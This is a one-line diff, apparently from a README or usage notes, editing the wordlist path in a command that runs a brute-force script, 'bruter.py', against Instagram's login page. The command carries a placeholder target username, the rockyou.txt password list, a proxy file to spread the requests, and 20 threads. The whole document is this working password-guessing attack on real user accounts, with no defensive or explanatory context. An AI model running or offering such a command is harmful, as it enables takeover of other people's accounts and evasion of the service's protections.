@@ -1,1 +1,1 @@
-python bruter.py --url https://www.instagram.com/accounts/login/ --username TARGETUSERNAME --wordlist rockyou.txt --proxies proxy.txt --threads 20
+python bruter.py --url https://www.instagram.com/accounts/login/ --username TARGETUSERNAME --wordlist /path/rockyou.txt --proxies proxy.txt --threads 20
